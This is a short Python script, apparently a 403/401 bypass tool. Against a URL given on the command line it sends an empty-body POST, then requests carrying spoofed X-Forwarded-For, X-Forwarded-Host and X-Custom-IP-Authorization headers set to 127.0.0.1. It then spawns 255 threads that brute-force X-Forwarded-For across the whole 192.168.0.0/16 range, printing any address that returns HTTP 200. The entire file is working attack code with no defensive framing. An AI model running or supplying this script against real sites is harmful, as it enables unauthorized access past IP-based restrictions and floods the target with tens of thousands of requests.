import requests
import sys
import threading
if (2 <= len(sys.argv) <= 2):
    url = sys.argv[1]
else:
    print("Usage: python 4xx.py url")
    exit()
r4 = requests.post(url,headers={"Content-Length": "0"})
if(r4.status_code == 200):
    print("post request and Content-Length:0")
a,b,c = {"X-Forwarded-For" : "127.0.0.1"},{"X-Forwarded-Host" : "127.0.0.1"},{"X-Custom-IP-Authorization": "127.0.0.1"}
for i in a,b,c:
    r = requests.get(url,headers=i)  
    if(r.status_code == 200):
        print("add this header on request "," ",i)

def attack(number):
    i = number
    for n in range(1,256):
        s = requests.get(url,headers={"X-Forwarded-For" : "192.168.{}.{}".format(n,i)})
        if (s.status_code == 200):
            print("192.168.{}.{}".format(n,i))
        
for i in range(1,256):
    x = threading.Thread(target=attack,args=(i,))
    x.start()
